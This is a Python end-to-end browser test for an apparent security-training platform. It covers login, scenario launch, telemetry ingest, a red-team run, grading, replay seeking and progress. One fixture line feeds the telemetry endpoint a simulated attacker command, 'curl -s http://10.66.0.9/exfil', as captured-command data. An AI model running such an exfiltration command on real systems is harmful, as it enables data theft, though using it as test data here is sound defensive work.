"""Stage 5 item 4 — checked-in browser E2E against the ACTUAL API (opt-in).

The real Next.js app (web/, a pure API client) served by `next start`, the
real uvicorn API on a disposable DB, and the real worker subprocess. Only the
external services are controlled substitutes: Proxmox (FakePVEHttp), the
model endpoint (fast fake OpenAI), the runner (local-dev transport), the
verifier exec (controlled host state) and the datapath (fake).

Isolation (milestone 01): ports are configurable and default to FREE
ephemeral ports; the web build goes to its OWN dist dir (`.next-e2e`,
baked with the chosen API URL) so a developer's `.next` is never touched;
the Playwright CLI is the PINNED local one (web/node_modules, devDependency)
and runs in a run-owned named session (`sr-e2e-<runid>`), never a shared or
the user's session. Nothing outside this run's own ports/dir/session is
created or removed.

Browser workflow asserted end to end:
  authenticated member -> create/launch -> connection instructions ->
  captured command (session-bound telemetry ingest) -> start red (real
  worker) -> end session (confirm dialog) -> graded report -> REPLAY
  (player mounts, timeline click really seeks) -> progress.

Run: SR_PG_ADMIN_CMD=... pytest -m browser
Skips (does not fail) when a prerequisite is absent: the pinned CLI, a
launchable browser, the web dependencies, or the chosen ports.
"""
from __future__ import annotations

import json
import os
import shutil
import socket
import subprocess
import threading
import time
import uuid
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[1]
WEB = REPO / "web"
OP_PW = "operator-testpw-9"
MEM_PW = "member-testpw-9"

pytestmark = [pytest.mark.browser, pytest.mark.db]


def _free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def _port_free(port: int) -> bool:
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind(("127.0.0.1", port))
        return True
    except OSError:
        return False
    finally:
        s.close()


def _cli() -> str | None:
    """The PINNED local Playwright CLI (web devDependency); PATH only as a
    declared fallback so CI without `npm ci` still runs the same commands."""
    local = WEB / "node_modules" / ".bin" / "playwright-cli"
    if local.exists():
        return str(local)
    return shutil.which("playwright-cli")


@pytest.fixture()
def ports():
    """Configurable, default-FREE ports — never assumes 8010/3000 are ours."""
    api = int(os.environ.get("SR_E2E_API_PORT") or 0) or _free_port()
    web = int(os.environ.get("SR_E2E_WEB_PORT") or 0) or _free_port()
    if not _port_free(api):
        pytest.skip(f"API port {api} busy — pick a free SR_E2E_API_PORT")
    if not _port_free(web):
        pytest.skip(f"web port {web} busy — pick a free SR_E2E_WEB_PORT")
    return {"api": api, "web": web,
            "api_url": f"http://127.0.0.1:{api}",
            "web_url": f"http://localhost:{web}"}   # baked URL + CORS origin


@pytest.fixture()
def browser(ports):
    """Run-owned named session on the pinned CLI; preflights a REAL browser
    launch so an absent browser is an explicit prerequisite, never a
    mid-test mystery. (Required mode converts the skip into a failure.)"""
    cli = _cli()
    if cli is None:
        pytest.skip("pinned playwright-cli missing — run `npm ci` in web/ first")
    session = f"sr-e2e-{uuid.uuid4().hex[:8]}"
    ch = os.environ.get("SR_E2E_BROWSER", "chromium")

    def pw(*args, timeout=90, check=True):
        r = subprocess.run([cli, f"-s={session}", *args],
                           capture_output=True, text=True, timeout=timeout,
                           cwd=REPO)
        if check and r.returncode != 0:
            raise AssertionError(f"playwright-cli {' '.join(args)} -> {r.returncode}\n"
                                 f"{r.stdout[-800:]}\n{r.stderr[-800:]}")
        return r

    try:
        pw("open", "about:blank", f"--browser={ch}", timeout=120)
    except (AssertionError, subprocess.TimeoutExpired) as e:
        text = str(e)
        clue = next((ln.strip() for ln in text.splitlines()
                     if "not found" in ln or "error while loading" in ln
                     or "install" in ln), text.strip().splitlines()[-1][:200])
        pytest.skip(f"browser {ch!r} cannot launch here: {clue} "
                    "(install it, e.g. `npx playwright install chromium`)")
    yield pw
    pw("close", check=False)


def _body_has(pw, text: str, timeout=40) -> str:
    """Poll the rendered page until innerText contains `text`."""
    deadline = time.time() + timeout
    last = ""
    while time.time() < deadline:
        last = pw("--raw", "eval", "document.body.innerText").stdout
        if text in last:
            return last
        time.sleep(0.5)
    pytest.fail(f"page never showed {text!r}; last body text:\n{last[:1500]}")


@pytest.fixture()
def web_app(ports, tmp_path):
    """Serve the REAL Next.js app from an ISOLATED dist dir baked for THIS
    run's API port; a developer's `.next` build is never read or replaced."""
    node_bin = WEB / "node_modules" / ".bin"
    if not (node_bin / "next").exists():
        pytest.skip("web/node_modules missing — run `npm ci` in web/ first")
    dist = WEB / os.environ.get("SR_E2E_DIST_DIR", ".next-e2e")
    marker = dist / ".sr-e2e-baked-url"
    # Next 16 resolves distDir RELATIVE to the project dir and silently
    # treats an absolute path as relative (an absolute SR_NEXT_DIST_DIR
    # built into web/home/dev/... and returned rc 0). Hand next a relative
    # path; Python keeps the absolute one for its own marker checks.
    dist_rel = os.path.relpath(dist, WEB)
    baked = f"http://localhost:{ports['api']}"
    need_build = ((not (dist / "BUILD_ID").exists())
                  or (not marker.exists()) or marker.read_text() != baked)
    if need_build:
        subprocess.run(["npm", "run", "build"], cwd=WEB, check=True,
                       env={**os.environ, "NEXT_PUBLIC_API_URL": baked,
                            "SR_NEXT_DIST_DIR": dist_rel,
                            "NEXT_TELEMETRY_DISABLED": "1"},
                       capture_output=True, text=True)
        marker.parent.mkdir(parents=True, exist_ok=True)
        marker.write_text(baked)
    proc = subprocess.Popen([str(node_bin / "next"), "start"], cwd=WEB,
                            env={**os.environ, "PORT": str(ports["web"]),
                                 "SR_NEXT_DIST_DIR": dist_rel,
                                 "NEXT_TELEMETRY_DISABLED": "1"},
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import httpx
    deadline = time.time() + 40
    while time.time() < deadline:
        try:
            if httpx.get(f"http://127.0.0.1:{ports['web']}", timeout=2).status_code == 200:
                break
        except Exception:
            time.sleep(0.5)
    else:
        proc.terminate()
        pytest.fail("next start never answered on the web port")
    yield proc
    proc.terminate()
    try:
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        proc.kill()


def test_browser_member_practice_loop(browser, web_app, ports, migrated_db,
                                      test_db_url_owner, tmp_path, monkeypatch):
    import httpx
    import uvicorn
    from sqlalchemy import create_engine, text

    from infra.proxmox_client import FakePVEHttp, ProxmoxClient
    from srplatform import settings as st
    from srplatform import verification_service
    from srplatform.api import deps
    from srplatform.api.app import app
    from srplatform.safety import Supervisor, set_supervisor
    from tests.conftest import wipe_data
    from tests.helpers import FakeDatapath
    from tests.test_stage5_acceptance import SlowFakeModel

    pw = browser
    API = ports["api_url"]
    WEB_URL = ports["web_url"]

    # ---- controlled external services + real API process ----------------------
    model = SlowFakeModel(delay=0.05)
    monkeypatch.setenv("SR_ENV", "dev")
    monkeypatch.setenv("RUNNER_TRANSPORT", "local-dev")
    monkeypatch.setenv("LLM_BASE_URL", f"http://127.0.0.1:{model.port}/v1")
    monkeypatch.setenv("LLM_API_KEY", "fake")
    monkeypatch.setenv("SAFETY_STATE_FILE", str(tmp_path / "safety.json"))
    monkeypatch.setenv("RECORDINGS_DIR", str(tmp_path / "rec"))
    monkeypatch.setenv("API_BASE_URL", API)  # also what spawned workers inherit
    monkeypatch.setenv("API_ALLOWED_ORIGINS", WEB_URL)  # THIS run's web origin
    st.get_settings.cache_clear()

    httpd = FakePVEHttp()
    for vmid in (9001, 9002, 9003, 9004):
        httpd.vms[vmid] = {"name": f"tpl{vmid}", "template": vmid, "status": "stopped"}
    wipe_data(test_db_url_owner)
    deps.set_proxmox(ProxmoxClient(api=httpd))
    sup = Supervisor(datapath=FakeDatapath(), state_file=str(tmp_path / "s.json"))
    sup.initialize_state(reason="browser e2e first install")
    set_supervisor(sup)
    for kind in ("baseline_check", "datapath_proof", "killswitch_test"):
        sup.record(kind, True, {})

    # deterministic verifier truth: flag present, sshd enabled, no rogue admin
    def true_state(host, command):
        if "cat" in command and "flag" in command:
            return 0, "FLAG{quick-win}\n"
        if "awk" in command:
            return 0, ""
        if "list-unit-files" in command:
            return 0, "sshd.service enabled enabled\nnginx.service enabled enabled\n"
        return 1, ""
    verification_service.set_verifier_exec(true_state)

    server = uvicorn.Server(uvicorn.Config(app, host="127.0.0.1", port=ports["api"],
                                           log_level="error"))
    threading.Thread(target=server.run, daemon=True).start()
    try:
        deadline = time.time() + 20
        while not server.started and time.time() < deadline:
            time.sleep(0.05)
        assert server.started, "API never started"

        # operator + member accounts through the real API
        assert httpx.post(f"{API}/auth/bootstrap", json={"username": "drew",
                                                         "password": OP_PW}).status_code == 201
        op = {"Authorization": "Bearer " + httpx.post(
            f"{API}/auth/login", json={"username": "drew", "password": OP_PW}
        ).json()["token"]}
        ru = httpx.post(f"{API}/users", headers=op, json={"username": "blue",
                                                          "password": MEM_PW,
                                                          "role": "member"})
        assert ru.status_code == 201, ru.text
        mem = {"Authorization": "Bearer " + httpx.post(
            f"{API}/auth/login", json={"username": "blue", "password": MEM_PW}
        ).json()["token"]}

        # ---- browser: authenticated member -----------------------------------
        pw("open", f"{WEB_URL}/")
        _body_has(pw, "enter the gym")
        pw("fill", 'input[placeholder="username"]', "blue")
        pw("fill", 'input[placeholder="password"]', MEM_PW)
        pw("click", 'button[type="submit"]')
        _body_has(pw, "scenario library")  # login worked and the library loaded

        # ---- create/launch through the UI ------------------------------------
        pw("click", 'tr:has-text("quick-win-01") button')
        _body_has(pw, "connections")
        path = pw("--raw", "eval", "location.pathname").stdout.strip().strip('"')
        assert "/session/" in path, path
        sid = path.rsplit("/", 1)[-1]
        # connection instructions rendered (bastion ssh line with its port)
        _body_has(pw, "2222")

        # ---- captured command: ingest under the session-bound host capability
        eng = create_engine(test_db_url_owner)
        with eng.connect() as conn:
            tok = conn.execute(text(
                "SELECT token FROM service_tokens WHERE session_id = :s "
                "AND scope = 'telemetry' AND host = 'web01'"), {"s": sid}).scalar()
        eng.dispose()
        assert tok, "launch did not enroll a per-host telemetry capability"
        r = httpx.post(f"{API}/ingest/auditd", json={"events": [
            {"kind": "command", "argv": "curl -s http://10.66.0.9/exfil", "uid": "1000",
             "comm": "bash", "exe": "/usr/bin/bash", "source_id": "71", "boot_id": "b1"}]},
            headers={"Authorization": f"Bearer {tok}"})
        assert r.status_code == 201 and r.json()["accepted"] == 1
        # the live dashboard (2s poll) shows the captured command event
        _body_has(pw, "web01", timeout=20)
        recent = pw("--raw", "eval", "document.body.innerText").stdout
        assert "command" in recent

        # ---- start red: REAL worker subprocess through the UI button ---------
        pw("click", 'button:has-text("start red")')
        _body_has(pw, "red run")
        deadline = time.time() + 120
        while time.time() < deadline:
            s = httpx.get(f"{API}/sessions/{sid}", headers=mem).json()
            if s.get("active_run") is None and s.get("status") not in ("preparing", "ready"):
                break
            time.sleep(1)
        else:
            pytest.fail("the red run never completed through the shared model path")

        # ---- end session (confirm dialog) -> trusted final score -------------
        pw("eval", "window.confirm = () => true")
        pw("click", 'button:has-text("end session")')
        _body_has(pw, "complete", timeout=60)

        # ---- graded report: explicit AAR generation, trusted scorecard -------
        sc = httpx.get(f"{API}/sessions/{sid}/score", headers=mem).json()
        assert sc["status"] == "scored" and sc["earned"] > 0, sc
        pw("goto", f"{WEB_URL}/session/{sid}/report")
        _body_has(pw, "generate AAR")
        pw("click", 'button:has-text("generate AAR")')  # fake model answers
        body = _body_has(pw, f"{sc['earned']}/{sc['total']}", timeout=60)
        assert "UNSCORED" not in body

        # ---- replay: player mounts and a timeline click REALLY seeks ---------
        # a synthetic bastion recording (cast under RECORDINGS_DIR + row),
        # exactly what the bastion would have registered. The epoch is 300s
        # in the past and the frames sit at 1s and 3600s, so every session
        # event offset lands inside the recording and the two frames bracket
        # the seek target: after a real seek the FIRST frame's text must be
        # rendered and the SECOND's must not — a no-op seek cannot produce
        # that state.
        import time as _t
        rec_dir = tmp_path / "rec"
        rec_dir.mkdir(exist_ok=True)
        cast = rec_dir / "e2e.cast"
        epoch = int(_t.time()) - 300
        cast.write_text(
            json.dumps({"version": 2, "width": 80, "height": 24,
                        "timestamp": epoch, "title": "e2e"}) + "\n"
            + json.dumps([1.0, "o", "hardening done\r\n"]) + "\n"
            + json.dumps([3600.0, "o", "flag captured\r\n"]) + "\n")
        eng = create_engine(test_db_url_owner)
        with eng.begin() as conn:
            conn.execute(text(
                "INSERT INTO recordings (recording_id, session_id, cast_path, "
                "status, bytes) VALUES (:r, :s, :p, 'sealed', :b)"),
                {"r": str(uuid.uuid4()), "s": sid, "p": str(cast),
                 "b": cast.stat().st_size})
        eng.dispose()
        pw("goto", f"{WEB_URL}/session/{sid}/replay")
        _body_has(pw, "event timeline")
        deadline = time.time() + 30
        while time.time() < deadline:
            if pw("--raw", "eval",
                  "!!document.querySelector('.asciinema-player')").stdout.strip() == "true":
                break
            time.sleep(0.5)
        else:
            pytest.fail("asciinema-player never mounted on the replay page")

        def _eval(expr: str) -> str:
            return pw("--raw", "eval", expr).stdout.strip().strip('"')

        # paused at t=0: the 1s frame is NOT rendered yet
        assert "hardening done" not in _eval(
            "document.querySelector('.asciinema-player').textContent")

        # the first timeline row shows its offset; it must sit strictly
        # between the two frames for the content assertion to prove position
        row = 'div[title^="#"] >> nth=0'
        off = float(_eval(
            "document.querySelector('div[title^=\"#\"]').innerText").split("s")[0])
        assert 1.5 < off < 3590, f"event offset {off}s outside the frame bracket"

        pw("click", row)
        # the player's OWN reported position (polled into data-now) must move
        # to the seek target, and the rendered frame content must change to
        # match that position — never just a click-side bookkeeping value
        deadline = time.time() + 20
        while time.time() < deadline:
            now_v = _eval("document.querySelector('[data-now]').getAttribute('data-now')")
            text = _eval("document.querySelector('.asciinema-player').textContent")
            try:
                moved = abs(float(now_v) - off) <= 2.0
            except ValueError:
                moved = False
            if moved and "hardening done" in text and "flag captured" not in text:
                break
            time.sleep(0.5)
        else:
            pytest.fail(f"timeline click never produced a real seek: "
                        f"data-now={now_v}, target={off}, rendered={text[:200]!r}")

        # ---- progress page reflects the scored session ------------------------
        pw("click", 'a[href="/progress"]')
        body = _body_has(pw, "by domain")
        assert "identify" in body or "protect" in body
    finally:
        verification_service.set_verifier_exec(None)
        server.should_exit = True
        model.stop()
        st.get_settings.cache_clear()
